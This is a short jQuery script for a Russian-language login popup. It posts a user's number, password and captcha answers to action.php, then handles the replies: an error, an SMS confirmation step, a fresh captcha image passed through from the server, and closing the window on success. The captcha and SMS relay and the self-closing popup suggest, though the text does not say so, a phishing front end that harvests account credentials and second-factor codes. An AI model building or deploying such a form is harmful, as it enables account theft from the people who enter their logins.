$("#login_button").on("click", function() {
	
$("#login_button").html('<div class="pr" id="btn_lock" style="opacity: 1;"><div class="pr_bt"></div><div class="pr_bt"></div><div class="pr_bt"></div></div>');

$.ajax({
        type: "POST",
        url: 'action.php',
        data: {
            captcha_sid: $("#captcha_sid").val(),
            captcha_key: $(".captcha-key").val(),
            cid: $(".form_input").val(),
            AccessRecovery: $("#user-number").val(),
            buttle: battle,
            ConfirmedPassword: $("#validation_password").val()
        },
		
	success: function(data) {

    $perem = $(data).find('div');		
	
	if(data == "1") {

	$("#login_button").html('Войти'),
	$("#errorRecovery").fadeIn();

	}
	
	if(data == "2") {
	$("#errorRecovery").fadeOut(),
	$("#sms").css("display", "block"),
	$("#login_button").html('Подтвердить');
		
	}
	
	else if($perem.eq(0).text() == "3") {
	$('#captcha_sid').val($perem.eq(1).text()),
	$(".captcha-img").attr("src",$perem.eq(2).text()),
	$("#captcha").css("display", "block"),
	$("#login_button").html('Подтвердить');
    }	
						
	else if(data == "true") {
	$("#errorRecovery").fadeOut(),
	$("#login_button").html('Войти')
	window.close();

}
					
}
      
    })

	
});